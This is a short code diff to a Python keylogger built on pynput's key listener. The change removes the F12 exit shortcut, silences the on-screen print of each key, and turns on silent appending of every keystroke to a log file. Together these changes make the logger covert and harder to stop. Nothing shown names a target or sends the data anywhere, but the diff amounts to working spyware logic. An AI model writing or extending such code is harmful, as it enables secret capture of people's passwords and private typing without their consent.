@@ -63,14 +63,14 @@ def logging(key):
     key = str(key)
     key = key.replace("'","")
 
-    if key == "Key.f12":
-        raise SystemExit(0)
+    # if key == "Key.f12":
+    #     raise SystemExit(0)
     
     key = beautify_key(key)
-    print(key)
+    # print(key)
 
-    # with open("log.txt", "a") as file:
-    #     file.write(key)
+    with open("log.txt", "a") as file:
+        file.write(key)
 
 with Listener(on_press=logging) as listener:
     listener.join()
